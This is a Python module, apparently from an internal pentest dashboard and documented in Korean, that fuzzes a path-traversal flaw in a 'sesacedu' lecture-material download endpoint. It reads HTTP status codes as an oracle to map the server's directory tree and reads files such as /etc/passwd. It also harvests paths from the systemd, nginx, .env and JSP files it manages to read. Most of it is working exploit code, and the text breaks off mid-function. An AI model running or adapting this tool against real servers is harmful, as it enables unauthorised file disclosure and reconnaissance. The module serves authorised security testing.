"""자료 경로 조작 퍼징 — 응답 코드로 서버 디렉터리 구조를 그린다.

`sesacedu_material_traversal` 은 **읽을 경로를 아는** 상태에서 그 파일을 가져온다.
이 모듈은 반대다 — **경로를 모르는** 상태에서 씨앗과 사전으로 찾아낸다.

## 응답 코드를 오라클로 쓴다

이 취약점은 디렉터리 목록을 주지 않는다. 그래서 코드 자체로 구조를 역산한다.

    200  파일이고 읽혔다
    500  있는데 파일로 못 보냄 — 디렉터리이거나 읽기 권한이 없다
    404  **stat 실패** — 없거나, 상위 경로에 탐색 권한이 없다

근거는 `LectureFileStorage.resolve()` 다. `exists()` 가 거짓이면 404 를 던지고,
참이면 `FileSystemResource` 전송에서 디렉터리·권한 문제로 예외가 나 500 이 된다.

## 단정하지 않는 두 가지 (2026-11-04 실측)

**404 는 '없음'이 아니다.** 리눅스에서 `/a/b` 를 stat 하려면 `/a` 에 실행(탐색)
권한이 필요하고, 없으면 EACCES 로 실패해 404 가 된다. 실서버에서 `/root` 는 500 인데
`/root/.bashrc` 는 404 였다 — 그 파일은 분명히 존재한다. 그래서 404 를 '없다'고
적지 않는다.

**500 은 두 가지를 겸하고 가릴 수 없다.** `<경로>/..` 를 한 번 더 때리면 디렉터리는
상위로 해석돼 500 이 오고 일반 파일은 ENOTDIR 로 404 가 온다. 그런데 **탐색 권한이
없는 디렉터리도 EACCES 로 404** 를 준다. `/etc/shadow/..` 와 `/root/..` 가 같은 404 다.
그래서 가리지 못한 500 은 '못 들어감'으로만 적고 '파일'이라고 쓰지 않는다.

## 왜 무차별이 아니라 씨앗부터인가

최상위에 사전 4,600개를 때리면 거의 전부 404 다. 반대로 'nginx 를 데비안 패키지로
깔면 /etc/nginx/sites-available 이 생긴다'는 **확정 사실**이다. 실측에서 찾은 94개 중
씨앗이 55개, 사전이 33개였다 — 씨앗이 사전보다 적중률이 높다.

사전 모드는 그 씨앗으로 **확정된 디렉터리 아래**에서만 쓴다. 범용 웹 사전보다
`fs-dirnames.txt` 가 잘 맞는다 — `webapps` 아래를 뚫은 이름은 `ROOT`·`ROOT.war` 였고,
범용 사전에는 없는 이름이다.

## 한 번에 끝나는 파이프라인

사람이 중간에서 결과를 읽고 다음 입력을 타이핑하지 않는다. 한 실행에서 이 고리를 돈다.

    씨앗 ─→ ┌─ (a) 수확   읽힌 설정 파일에 적힌 절대경로를 캔다
            │  (b) 가리기  500 이 디렉터리인지 가린다
            │  (c) 넓히기  순위를 매겨 앞에 선 곳에 이름 묶음을 준다
            └─ 새로 찾은 것이 없으면 멈춘다 (최대 5바퀴)

**(a)(b)(c) 의 순서가 중요하다.** 수확이 `/srv/sesacedu/api` 를 큐에 넣어도 그것이
디렉터리인지는 가려 봐야 안다. 가리기를 바퀴 **머리**에서 하면 수확 결과가 한 바퀴 늦게
반영되고, 그 사이 1바퀴가 예산을 엉뚱한 곳에 다 쓴다 — 11-06 1차 실행에서 그렇게
`srv`·`opt` 아래 31개를 놓쳤다. 그래서 수확 **직후**에 가린다.

## 예산을 어디에 쓰는가

찾은 디렉터리 전부에 사전을 뿌리면 터진다. 11-04 실측에서 디렉터리 40곳 중 10곳만
넓혀 743요청을 썼고, 적중은 5곳에서 났다. 그 선택을 규칙으로 바꿨다.

**어느 곳을** — 적중이 난 5곳은 전부 (a) 씨앗이 그 아래를 하나도 모르고 (b) 설정이
선언한 배포 경로 아래였다. 두 조건으로 세우면 사람이 고른 10곳이 그대로 앞에 선다.

**무엇을** — `conf` 아래에 있는 것은 설정 **파일** 이름이고 배포 루트 아래에 있는 것은
**디렉터리** 이름이다. 209개를 한 곳에 다 보내면 절반이 헛되므로 성격에 맞는 묶음을
먼저 준다.

**어느 순서로** — 일거리를 네 칸으로 나눠 앞 칸을 다 쓰기 전에 뒤 칸을 건드리지 않는다.

    0  배포 영역 · 성격에 맞는 이름     srv/sesacedu/api → conf · webapps
    1  배포 영역 · 나머지 이름
    2  그 밖      · 성격에 맞는 이름     etc/cron.daily · usr/sbin
    3  그 밖      · 나머지 이름

한 바퀴에 **한 칸만** 쓰고, 새로 찾은 것이 있으면 순위를 다시 매긴다. 칸을 안 나누면
`etc/cron.*`·`usr/sbin` 이 넓힌 24곳 중 15곳을 차지하고 2,592요청을 먹는데 정작
`api/conf`·`web/conf` 는 끝까지 안 열린다 — 11-06 3차 실행에서 그렇게 됐다.

## 멈춘 이유를 구별해 적는다

세 가지를 섞으면 안 본 곳을 '없다' 로 읽게 된다. 그래서 따로 적는다.

    더 안 나옴      일거리가 남지 않았다 — 이 범위에서는 다 본 것이다
    요청 상한       예산이 바닥났다 — 뒤쪽 디렉터리는 **안 본 것**이다
    바퀴 상한       단계가 더 깊다 — 다시 돌리거나 '확장만' 으로 이어서 그린다

## 모듈이 찾은 것과 밖에서 온 것은 섞지 않는다

이 모듈이 세우는 것은 **자기 페이로드로 기계적으로 확인한 것**뿐이다. 그 밖에
사람이나 AI 가 읽힌 설정 파일 내용에서 절대경로를 읽어 넣어 확인한 것은 **다른 출처**다. 같은 트리에 들어가더라도 출처를 함께 적고 집계도 따로 낸다.

    씨앗     이 모듈 — 패키지 기본 경로 사전
    확장     이 모듈 — 1단계가 확정한 디렉터리 아래
    단서     밖에서 옴 — 읽힌 파일 내용에서 사람·AI 가 찾아 넣은 경로

보고서에 "퍼징으로 찾았다"고 쓸 수 있는 것은 앞의 둘뿐이다. 단서로 찾은 것은
**무엇을 읽고 알아냈는지**까지 함께 적어야 재현된다.

## 수확 — 읽은 파일이 다음 경로를 알려 준다

사전은 이름을 **맞혀야** 찾는다. 설정 파일은 경로를 **적어 놓는다**. 그래서 파일이 하나 읽히면
그 안의 절대경로를 뽑아 다시 때린다. 거기서 또 읽히면 한 바퀴 더(기본 2바퀴).

    systemd 유닛  WorkingDirectory= · EnvironmentFile= · ExecStart= · JAVA_HOME=
    nginx         root · include · ssl_certificate · access_log
    .env          APP_STORAGE_ROOT 처럼 path·dir·home·root 로 끝나는 키

`jdk-11.0.24+8` 처럼 버전이 박힌 이름이나 난수 접두사가 붙은 저장 파일명은 **어떤 사전에도
없고 이 길로만 나온다.** 실측에서 사람이 눈으로 하던 일이다.

**결과에는 경로만 올린다.** 읽은 내용은 경로를 뽑는 동안만 메모리에 두고 버린다.
다만 **요청 기록에는 받은 그대로 남는다**(2026-11-07부터) — 무엇이 읽혔는지가 증거다.

수확으로 찾은 것은 출처 `수확` 으로 적는다. 모듈이 스스로 한 일이므로 퍼징의 성과에 들어가되,
씨앗·확장과는 찾은 방식이 다르다.

## 지도를 그리기 전에 오라클을 교정한다

응답 코드를 뜻으로 읽는 모듈이라, **코드가 뜻을 잃으면 결과가 조용히 거짓이 된다.**
취약점이 막혔거나 토큰이 죽으면 전부 404 로 돌아오는데, 그 그림은 '아무것도 없는
서버' 와 구별되지 않는다. 그래서 답을 아는 경로 네 개를 먼저 때려 본다.

    etc/passwd      200 이어야 한다 — 읽히는 파일
    etc             500 이어야 한다 — 디렉터리
    etc/..          500 이어야 한다 — 디렉터리 뒤 '/..' 는 상위로 해석된다
    etc/passwd/..   404 여야 한다 — 파일 뒤 '/..' 는 ENOTDIR

넷 중 하나라도 틀리면 **지도를 그리지 않고 멈춘다.** 뒤 두 개는 종류 가리기가
의지하는 바로 그 성질이라, 이것이 통하지 않으면 '디렉터리' 판정 전체가 무효다.

## 올라갈 단계는 재지 추측하지 않는다

`../` 를 몇 개 붙여야 최상위에 닿는지는 저장 폴더의 깊이에 달려 있고, 배포가 바뀌면
같이 바뀐다. 1단부터 올려 가며 **`etc/passwd` 가 처음 읽히는 단계**를 쓴다. 더 올라가도
최상위에 머물기 때문에 최소값만 찾으면 된다. 실서버 측정값은 6이었다.

## 한계 — 이름을 맞혀야만 찾는다

수확이 메우는 것은 **읽히는 파일(200)에 적힌** 경로까지다. 500(있는데 못 읽음)에서는
이름을 캘 수 없고, 난수 접두사가 붙은 저장 파일명(`9041a34f_...`)은 설정 파일에도
안 적혀 있어 DB 쪽에서 얻어야 한다.

칼리에서 더 깊이 돌려 알아낸 경로가 있으면 '단서로 받은 경로' 칸에 넣는다.
그렇게 들어온 것은 출처가 '단서' 로 남아, 이 모듈이 스스로 찾은 것과 섞이지 않는다.
"""
import re

from flask import current_app, has_app_context

from dashboard.core import Finding, ToolResult, excerpt as _excerpt, fetch
from dashboard.payloads import ENCODINGS, traversal
from dashboard import wordlists
from projects.sesacedu.fs_knowledge import describe
from projects.sesacedu.fs_tree import _size, _tree

# 한 번에 보낼 수 있는 절대 상한. 11-04 실서버 실측에서 구조 전체(94노드)를 그리는 데
# 1,342 요청이 들었다 — 몇백으로는 한 실행에 같은 지도가 나올 수 없다.
MAX_REQUESTS = 6000
DEFAULT_BUDGET = 3000

META = {
    "id": "sesacedu_material_traversal_fuzz",
    "name": "자료 경로 조작 퍼징 (구조 그리기)",
    "category": "경로 조작",
    # 로그인한 사용자가 저장소 밖 파일·디렉터리 구조를 알아낸다
    "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    # 노션 '웹 서비스 취약점 목록' 의 취약점 유형 — 같은 경로 조작으로 저장 폴더 밖 구조를 알아내는 것
    "vuln": "FILE",
    "kind": "active",
    "roles": ["user_web", "practice"],
    "stage": "tool",
    "severity": "high",
    "attack": [
        {"tactic": "TA0007", "technique": "T1083", "name": "File and Directory Discovery"},
        {"tactic": "TA0043", "technique": "T1595.003", "name": "Active Scanning: Wordlist Scanning"},
    ],
    "description": "씨앗(패키지 기본 경로)이나 사전으로 경로를 때려 응답 코드로 "
                   "디렉터리 구조를 그립니다. 읽히는 설정 파일은 **거기 적힌 경로를 "
                   "캐내려고 내용을 받지만**, 결과에는 경로만 올립니다. 받은 내용은 "
                   "요청 기록에서 그대로 볼 수 있습니다.",
    "needs": [
        {"kind": "auth_header", "name": "Authorization",
         "why": "강의 자료는 로그인한 사용자만 내려받을 수 있어, 토큰이 없으면 전부 401 로 "
                "돌아옵니다 — 그러면 '아무것도 없다'는 거짓 지도가 나옵니다",
         "how": "대상 탭에서 그 대상의 '인증 헤더' 에 Authorization: Bearer <토큰> 을 "
                "한 줄 넣습니다. 테스트 계정 토큰만 쓰세요"},
        {"kind": "env", "name": "DASH_WORDLISTS", "required": False,
         "why": "저장소 씨앗 사전만으로는 이름 후보가 좁습니다. SecLists 를 붙이면 "
                "raft-small-directories 처럼 디렉터리 이름만 모은 목록을 고를 수 있습니다",
         "how": "SecLists 를 받아 대시보드를 띄우기 전에 DASH_WORDLISTS 에 그 폴더를 "
                "넣습니다 (wordlists/README.md). 칼리에는 /usr/share/seclists 에 이미 있습니다"},
    ],
    "params": [
        {"name": "mode", "need": "required", "label": "어디까지 할지", "type": "select", "default": "pipeline",
         "options": [
             {"value": "pipeline", "label": "전부 — 씨앗 → 찾은 디렉터리 아래 확장 → 종류 가리기 → 트리"},
             {"value": "seed", "label": "씨앗만 — 1단계에서 멈춘다"},
             {"value": "expand", "label": "확장만 — 기준 디렉터리를 내가 적는다"},
         ],
         "help": "기본은 한 번에 끝납니다. 2단계 기준 디렉터리는 1단계가 찾아낸 것을 그대로 씁니다 "
                 "— 결과를 읽고 다시 타이핑하지 않습니다."},
        {"name": "wordlist", "need": "required", "label": "씨앗 사전 (1단계)", "type": "wordlist", "purpose": "path",
         "default": "fs-seeds-sesacedu.txt",
         "help": "패키지를 깔면 생기는 **전체 경로** 목록입니다."},
        {"name": "names", "need": "optional", "label": "이름 사전 (2단계)", "type": "wordlist", "purpose": "path",
         "default": "fs-dirnames.txt",
         "help": "1단계가 찾은 디렉터리 아래에 붙일 **이름** 목록입니다. SecLists 를 붙이면 함께 뜹니다."},
        {"name": "base", "need": "conditional", "when": "'확장만' 을 고를 때만 씁니다", "label": "기준 디렉터리 (확장만 모드)", "default": "srv/sesacedu",
         "help": "'확장만' 에서 이 아래를 때립니다. 맨 앞 / 는 빼고 씁니다. 다른 모드에서는 무시합니다."},
        {"name": "min_severity", "need": "optional", "label": "결과로 올릴 최소 민감도", "type": "select", "default": "high",
         "options": [{"value": v, "label": l} for v, l in
                     (("critical", "치명만"), ("high", "높음 이상"), ("medium", "보통 이상"),
                      ("low", "낮음 이상"), ("none", "따로 올리지 않음"))],
         "help": "읽힌 파일 중 이 등급 이상은 결과 탭에 따로 올립니다. 트리에는 전부 보입니다."},
        {"name": "rounds", "need": "optional", "label": "읽은 파일에서 경로를 더 뽑아낼 횟수",
         "type": "int", "default": "2",
         "help": "읽힌 설정 파일 안에 적힌 절대경로를 뽑아 다시 때립니다. 거기서 또 파일이 읽히면 "
                 "한 바퀴 더. 0 이면 수확하지 않습니다. 사전으로는 못 찾는 이름(버전·난수)이 "
                 "이 길로만 나옵니다."},
        {"name": "hints", "need": "optional", "label": "단서로 받은 경로 (한 줄에 하나)", "type": "textarea", "default": "",
         "placeholder": "opt/java/jdk-11.0.24+8\nsrv/sesacedu/config/api.env",
         "help": "읽힌 설정 파일 내용에서 사람·AI 가 찾아낸 절대경로입니다. 사전으로는 못 찾는 "
                 "이름(버전·난수)이 여기 들어옵니다. **출처를 '단서' 로 따로 적어** "
                 "퍼징이 스스로 찾은 것과 섞이지 않게 합니다."},
        {"name": "limit", "need": "optional", "label": "사전에서 몇 개까지 써 볼지",
         "type": "int", "default": "200",
         "help": "사전 앞에서부터 이만큼만 씁니다. 이름 하나에 요청 하나입니다 — 늘리면 그만큼 "
                 "오래 걸립니다. 저장소 씨앗 사전은 115줄이라 기본값으로 전부 들어갑니다."},
        {"name": "budget", "need": "optional", "label": "요청 상한 (한 실행)",
         "type": "int", "default": str(DEFAULT_BUDGET),
         "help": "이 실행에서 보낼 요청의 총량입니다. **실서버 구조 전체(94개)를 그리는 데 "
                 "1,342 요청이 들었습니다** — 몇백으로는 같은 지도가 나오지 않습니다. "
                 "작게 주면 넓히기가 앞쪽 디렉터리에서 끊기고, 끊긴 것은 결과에 적힙니다. "
                 "최대 %d." % MAX_REQUESTS},
        {"name": "kinds", "need": "optional", "label": "찾은 것이 폴더인지 더 알아볼지",
         "type": "select", "default": "yes",
         "options": [
             {"value": "yes", "label": "알아본다 — 폴더·파일을 나눠 트리를 그린다 (요청이 늘어납니다)"},
             {"value": "no", "label": "안 알아본다 — 요청을 아낀다 (전부 '있음' 으로만 남습니다)"},
         ],
         "help": "'전부' 로 돌릴 때는 **끄더라도 가립니다** — 디렉터리가 어디인지 모르면 "
                 "넓힐 곳이 없어 2단계가 아예 못 돕니다. '씨앗만' 에서는 뜻대로 건너뜁니다. "
                 "서버는 '있다' 까지만 알려 주고 폴더인지 파일인지는 말해 주지 않습니다. "
                 "경로 뒤에 한 칸 위로 올라가는 표시를 덧붙여 보면 폴더는 위로 올라가 또 '있음' 이 "
                 "오고, 파일은 '없음' 이 옵니다. 다만 **들어갈 권한이 없는 폴더도 똑같이 '없음'** 이라, "
                 "그 둘은 끝내 갈라지지 않습니다 — 그런 것은 트리에 '못 들어감' 으로 적습니다."},
        {"name": "depth", "need": "optional", "label": "폴더를 몇 칸 위로 올라갈지",
         "default": "auto",
         "help": "`auto` 로 두면 **직접 재서** 씁니다 — 1단부터 올려 가며 `/etc/passwd` 가 "
                 "처음 읽히는 단계를 찾습니다(실서버 측정값 6). 숫자를 적으면 그 값을 그대로 "
                 "씁니다. 모자라면 전부 404 로 와서 '아무것도 없는 서버' 처럼 보이기 때문에, "
                 "고정값을 쓰는 쪽이 오히려 위험합니다."},
        {"name": "scheme", "need": "required", "label": "인코딩", "type": "select", "default": "double-full",
         "options": [{"value": k, "label": v} for k, v in ENCODINGS.items()]},
        {"name": "lecture", "need": "required", "label": "강의 번호", "default": "123"},
    ],
}

PATH = "/backend/lectures/{lecture}/material/download?file={payload}"
DIR = "dir"
OPAQUE = "opaque"

# 어디서 온 경로인가. 모듈이 스스로 찾은 것과 밖에서 들어온 것을 섞지 않는다.
SEED, EXPAND, HARVEST, HINT = "seed", "expand", "harvest", "hint"
SOURCE_LABEL = {SEED: "씨앗", EXPAND: "확장", HARVEST: "수확", HINT: "단서(밖에서)"}
MINE = (SEED, EXPAND, HARVEST)   # 이 모듈이 자기 페이로드로 찾은 것
MAX_HARVEST = 80                 # 한 바퀴에 수확할 경로 수 상한
MAX_ROUNDS = 24                  # 한 바퀴에 일거리 한 칸. 더 안 나오면 그 전에 멈춘다
# webapps/<앱>/WEB-INF/classes 는 srv/sesacedu 에서 다섯 단계 아래다 —
# 5바퀴로는 JSP 앱 안쪽에 닿지 못한다(11-06).

# 응답 코드 → 뜻. 404 를 '없음'이라고 쓰지 않는 것이 요점이다.
READABLE, EXISTS, UNSTAT, DENIED, AUTH = "readable", "exists", "unstat", "denied", "auth"
BY_STATUS = {200: READABLE, 401: AUTH, 403: DENIED, 404: UNSTAT, 500: EXISTS}
LABEL = {
    READABLE: "읽힘",
    EXISTS: "있음(파일로 못 보냄)",
    UNSTAT: "없음 또는 접근 불가",
    DENIED: "탈출 검사 차단",
    AUTH: "토큰 필요",
}


def _send(target, lecture, depth, scheme, path):
    """경로 하나를 때린다. 파일 내용은 기록하지 않는다(구조만 본다)."""
    payload = traversal(path, depth, scheme)
    url = target.url + PATH.format(lecture=lecture, payload=payload)
    # 아래 r.body 는 경로를 수확하는 동안만 쓰고 버린다(결과에는 경로만 올린다).
    # 요청 기록에는 받은 그대로 남는다.
    #
    # max_bytes 를 수확 상한에 맞춘다. 기본값은 1MB 라 쓰지도 않을 본문을 그만큼 받아
    # 왔다(11-06 검수). 구조 판정에는 코드와 길이만 쓰므로 더 받을 이유가 없다.
    r = fetch(url, max_bytes=MAX_BODY)
    klass = BY_STATUS.get(r.status, "other")
    return klass, r


def _uniq(paths):
    """순서를 지키며 중복 제거. 좋은 사전은 빈도순이라 자를 때 순서가 중요하다."""
    seen, out = set(), []
    for p in paths:
        p = (p or "").strip().strip("/")
        if p and p not in seen:
            seen.add(p)
            out.append(p)
    return out


def _names_under(base, words):
    """기준 디렉터리 아래에 이름을 붙인다. 경로 조각으로 못 쓸 줄은 센다."""
    out, bad = [], 0
    for w in words:
        w = (w or "").strip().strip("/")
        if not w or "/" in w or ".." in w:
            bad += 1
            continue
        out.append(base + "/" + w)
    return out, bad


class _Walker:
    """경로를 때리고 결과를 모은다. 예산을 넘지 않게 스스로 센다."""

    def __init__(self, target, lecture, depth, scheme, budget):
        self.t, self.lecture, self.depth, self.scheme = target, lecture, depth, scheme
        self.left = budget
        self.sent = 0
        self.auth_stop = False
        self.nodes = []
        self.seen = set()
        # 응답 종류별 횟수. 전에는 200·500 이 아닌 응답을 **세지도 않고 버렸다** —
        # 그래서 도중에 403(탈출 검사 차단)·429(속도 제한) 벽이 서도 결과에는
        # '아무것도 없다' 로만 보였고, 잘린 지도가 완전한 지도로 보고됐다(11-06 검수).
        self.codes = {}

    def hit(self, paths, source):
        """경로 묶음을 때려 200·500 만 남긴다. 401 이면 즉시 멈춘다."""
        found = []
        for path in paths:
            if self.auth_stop or self.left <= 0:
                break
            if path in self.seen:
                continue
            self.seen.add(path)
            self.left -= 1
            self.sent += 1
            klass, r = _send(self.t, self.lecture, self.depth, self.scheme, path)
            self.codes[klass] = self.codes.get(klass, 0) + 1
            if klass == AUTH:
                self.auth_stop = True
                break
            if klass not in (READABLE, EXISTS):
                continue
            node = {"path": "/" + path, "class": klass, "status": r.status,
                    "size": len(r.body or ""), "kind": None, "is_dir": None,
                    "note": "", "severity": "info", "source": source, "_r": r,
                    # 수확에만 쓰고 결과·기록에는 절대 넣지 않는다
                    "_body": r.body if klass == READABLE else ""}
            self.nodes.append(node)
            found.append(node)
        return found

    def sort_kinds(self, nodes):
        """500 의 종류 가리기 — 디렉터리면 '<경로>/..' 가 상위로 해석돼 또 500 이 온다."""
        for n in nodes:
            if n["class"] != EXISTS or self.auth_stop or self.left <= 0:
                continue
            self.left -= 1
            self.sent += 1
            klass, _ = _send(self.t, self.lecture, self.depth, self.scheme,
                             n["path"].strip("/") + "/..")
            self.codes[klass] = self.codes.get(klass, 0) + 1
            if klass == AUTH:
                self.auth_stop = True
                return
            n["kind"] = DIR if klass == EXISTS else (OPAQUE if klass == UNSTAT else None)
            n["is_dir"] = True if n["kind"] == DIR else None
            # 403 처럼 뜻을 모르는 응답이 오면 **가리지 못한 것으로 적어 둔다.**
            # kind 를 None 으로 두면 '아직 안 가림' 과 구별되지 않아 바퀴마다 다시
            # 때리고, 결국 '미판별' 로 남는 이유도 알 수 없다(11-06 검수).
            if n["kind"] is None:
                n["probe_inconclusive"] = klass


# 읽힌 파일 안에서 절대경로를 끄집어낸다.
# 사전은 이름을 '맞혀야' 찾지만, 설정 파일은 경로를 **적어 놓는다**. 버전이 든 이름
# (jdk-11.0.24+8)이나 배포 디렉터리는 이 길로만 나온다.
#
# 규칙은 11-04 실측에서 **실제로 수확이 된 형태**만 추렸다(모의해킹 세션 제공).
# 범용 정규식 하나로 훑으면 URL·버전 문자열이 쏟아진다.
MAX_BODY = 256 * 1024       # 수확하려고 받는 본문의 상한. web.xml 같은 건 비용만 크다

# 값이 '키 = /경로' 꼴로 적히는 자리들
_ASSIGN = re.compile(r"""(?im)^\s*(?:export\s+)?
    (?P<k>WorkingDirectory|ExecStart|ExecStartPre|ExecStop|EnvironmentFile|ReadWritePaths|
       StateDirectory|RuntimeDirectory|LogsDirectory|
       root|alias|include|access_log|error_log|ssl_certificate|ssl_certificate_key|
       common\.loader|shared\.loader|
       JAVA_HOME|CATALINA_HOME|CATALINA_BASE|[A-Za-z0-9_.]*(?:path|dir|home|file|root))
    \s*[=:]\s*["']?(?P<v>[^"'\s;,]+)""", re.X)

# 설치본을 가리키는 키. `*_HOME` 은 관례상 **제품을 깐 자리**를 가리키고, 그 안은
# tarball 이 넣어 준 것이라 우리 배포물이 아니다 — 톰캣이 바로 그 구분을 쓴다
# (CATALINA_HOME = 설치본 · CATALINA_BASE = 이 인스턴스).
#
# 11-06 5차 실행에서 이 구분이 없어 `opt/apache-tomcat-10.1.1/webapps/{docs,examples,
# manager,host-manager}` 와 `opt/java/.../lib/server` 가 예산을 먹고, 정작
# `web/webapps/ROOT/WEB-INF` 는 못 열렸다. 경로 자체는 그대로 수확한다 —
# **넓힐 곳 순위에서만** 뒤로 보낸다.
_STOCK_KEY = re.compile(r"(?i)home$")

# systemd 의 Environment= 는 'KEY=값' 이 한 번 더 중첩돼 있다 — 두 단계로 읽는다.
# 11-04 실측에서 JAVA_HOME·CATALINA_HOME·CATALINA_BASE 가 전부 여기 있었다.
_ENV_LINE = re.compile(r"(?im)^\s*Environment\s*=\s*[\"']?(?P<body>[^\"'\n]+)")
_KV = re.compile(r"(?P<k>[A-Za-z0-9_.]+)\s*=\s*(?P<v>/[^\s:;,]+)")

# 보조 — 본문에 그냥 적힌 /usr/lib/... 꼴. 조각 2개 이상인 것만 본다.
_PATH = re.compile(r"(?<![\w%:/])(?:/[A-Za-z0-9._+\-]{1,64}){2,}")

# ── JSP 앱 안쪽을 따라가는 규칙 ────────────────────────────────
# 풀린 WAR 안에서 페이지 이름은 **사전으로 맞힐 수 없다**(detail.jsp · classroom.jspf).
# 그런데 앱은 그 이름을 스스로 적어 둔다 — web.xml 의 welcome-file·jsp-file 과,
# JSP 가 다른 JSP 를 끌어 쓰는 include 줄이다. 그래서 그 둘을 읽는다.
#
# 이 경로는 **파일이 있는 폴더 기준 상대 경로**로 적히는 일이 많다
# (`<%@ include file="common/header.jspf" %>`). 그래서 `near` 로 그 폴더를 받아 붙인다.
# web.xml 이 적는 자리 — 값은 **앱 뿌리 기준**이다(앞에 / 가 없어도 그렇다)
_JSP_APPREL = re.compile(r"""(?ix)
      <(?:welcome-file|jsp-file)>\s*(?P<v>[^<\s]+)""")
# JSP 가 다른 JSP 를 끌어 쓰는 자리 — 앞에 / 가 있으면 앱 뿌리, 없으면 그 파일 폴더 기준
_JSP_FILEREL = re.compile(r"""(?ix)
      (?: <%@\s*include\s+file\s*=\s*["'](?P<i>[^"']+)["']
        | <jsp:include\s+page\s*=\s*["'](?P<p>[^"']+)["']
        | (?:forward|sendRedirect)\s*\(\s*["'](?P<f>[^"']+\.jspf?)["']
        | (?:href|action|src|location)\s*=\s*["'](?P<h>[^"':]+\.jspf?(?:\?[^"']*)?)["']
      )""")
# 마지막 보조 — 조각 없이 이름만 적힌 자리. 어디 있는지 모르니 앱 뿌리와 이 폴더 둘 다 본다.
_JSP_NAME = re.compile(r"""(?i)["'=/(]\s*([A-Za-z0-9._\-]{1,48}\.jspf?)\b""")

# 경로처럼 생겼지만 쓸모없거나 가상인 것
_NOISE_EXACT = ("/dev/null", "/bin/sh", "/bin/bash", "/usr/bin/env", "/bin/true")
_NOISE_UNDER = ("/proc/", "/sys/", "/dev/")


def _usable(p: str) -> bool:
    """경로로 쓸 만한가. 거르는 이유를 한 군데 모아 둔다."""
    if not p.startswith("/") or " " in p or "\t" in p:
        return False
    if "://" in p or p.startswith("//"):          # URL 은 경로가 아니다
        return False
    if len(p) < 4 or len(p) > 200 or p.count("/") > 12:
        return False
    if p in _NOISE_EXACT or any(p.startswith(n) for n in _NOISE_UNDER):
        return False
    segs = [s for s in p.split("/") if s]
    # `.` · `..` 가 든 경로는 버린다. `_PATH` 정규식이 글자 집합에 `.` 을 넣고 있어
    # 본문의 `../..` 같은 조각을 경로로 본다 — 그대로 때리면 올라가기와 섞여 최상위가
    # `/../..` 라는 이름으로 트리에 들어온다(11-06 2차 실행에서 실제로 나왔다).
    if any(s in (".", "..") for s in segs):
        return False
    return all(len(seg) <= 64 for seg in segs)


def _parents(path: str):
    """부모 사슬. /srv/a/b/c 를 얻으면 /srv/a/b · /srv/a 도 넣는다.

    요청 1건에 디렉터리 하나라 값이 좋다 — 트리의 가지가 한 번에 드러난다.
    """
    parts = path.strip("/").split("/")
    return ["/" + "/".join(parts[:i]) for i in range(len(parts) - 1, 1, -1)]


def _declared_in(text):
    """설정이 **키로 선언한** 경로만. `KEY=/경로` 와 systemd 의 2단 `Environment=`.

    본문에 그냥 적힌 경로(`_PATH` 정규식)와 갈라 두는 이유가 있다. `/etc/crontab` 에는
    `run-parts /etc/cron.daily` 같은 OS 기본 줄이 있어 정규식으로는 `/etc/cron.*` 가
    쏟아진다. 그것도 실재하는 경로이긴 하지만 **이 서버의 배포 구조가 아니다.**
    선언된 쪽만 모아 두면 `CATALINA_BASE=/srv/sesacedu/api` 처럼 배포가 적어 둔 경로가
    남고, 그 집합이 '어디를 넓힐지' 를 정하는 근거가 된다(`rank_dirs`).
    """
    for m in _ENV_LINE.finditer(text):            # Environment=KEY=/경로 (2단)
        for kv in _KV.finditer(m.group("body")):
            yield kv.group("k"), kv.group("v")
    for m in _ASSIGN.finditer(text):              # 키 = /경로
        yield m.group("k"), m.group("v")


def harvest_declared(text: str, base_hint: str = ""):
    """선언된 경로와 그 부모 사슬. 넓힐 곳을 정하는 데만 쓴다."""
    if not text:
        return []
    text = text[:MAX_BODY]
    if base_hint:
        text = text.replace("${catalina.base}", base_hint).replace("${catalina.home}", base_hint)
    out, seen = [], set()
    for key, p in _declared_in(text):
        if _STOCK_KEY.search(key or ""):      # JAVA_HOME · CATALINA_HOME — 설치본
            continue
        p = p.rstrip("/.,;:)")
        if not _usable(p):
            continue
        for cand in [p] + _parents(p):
            key = cand.lstrip("/")
            if key and key not in seen:
                seen.add(key)
                out.append(key)
    return out


def _webapp_root(near: str) -> str:
    """풀린 WAR 의 뿌리. `/srv/.../webapps/ROOT/WEB-INF` → `/srv/.../webapps/ROOT`.

    web.xml 의 `/detail.jsp` 는 **앱 뿌리** 기준이다. 파일시스템 최상위가 아니다 —
    그대로 `/detail.jsp` 로 때리면 없는 경로가 된다.
    """
    parts = [s for s in near.strip("/").split("/") if s]
    for i in range(len(parts) - 1, -1, -1):
        if parts[i] in ("WEB-INF", "META-INF"):
            return "/" + "/".join(parts[:i])
    return "/" + "/".join(parts)


def harvest_jsp(text: str, near: str):
    """JSP 앱이 스스로 적어 둔 페이지 이름을 캔다. `near` 는 그 파일이 있는 폴더다.

    자리마다 **기준이 다르다.** web.xml 의 `<jsp-file>/lecture/detail.jsp` 는 앱 뿌리
    기준이고, JSP 의 `include file="common/header.jspf"` 는 그 JSP 가 있는 폴더
    기준이다. 하나로 뭉쳐 붙이면 `WEB-INF/detail.jsp` 같은 없는 경로가 나온다.
    """
    if not text or not near:
        return []
    text = text[:MAX_BODY]
    app = _webapp_root(near)
    here = "/" + near.strip("/")

    # (기준이 될 폴더 목록, 참조) 쌍으로 모은다
    refs = []
    for m in _JSP_APPREL.finditer(text):
        refs.append(([app], m.group("v")))
    for m in _JSP_FILEREL.finditer(text):
        v = next(x for x in m.groups() if x)
        refs.append(([app] if v.startswith("/") else [here], v))
    for name in _JSP_NAME.findall(text):
        if "/" not in name:                     # 이름만 적힌 것 — 어디인지 모른다
            refs.append(([app, here], name))

    out, seen = [], set()
    for bases, ref in refs:
        ref = ref.strip().split("?")[0].split("#")[0].lstrip("/")
        if not ref or ".." in ref or "://" in ref:
            continue
        for base in bases:
            cand = (base.rstrip("/") + "/" + ref).replace("//", "/")
            if not _usable(cand):
                continue
            for c in [cand] + _parents(cand):
                key = c.lstrip("/")
                if key and key not in seen:
                    seen.add(key)
                    out.append(key)
    return out


def harvest_paths(text: str, limit: int = MAX_HARVEST, base_hint: str = ""):
    """파일 내용에서 서버 절대경로 후보를 뽑는다. **내용 자체는 어디에도 남기지 않는다.**

    `base_hint` 는 `${catalina.base}` 처럼 치환이 필요한 자리에 넣을 값이다
    (유닛의 CATALINA_BASE 에서 얻는다).
    """
    if not text:
        return []
    text = text[:MAX_BODY]
    if base_hint:
        text = text.replace("${catalina.base}", base_hint).replace("${catalina.home}", base_hint)

    found = [v for _k, v in _declared_in(text)]
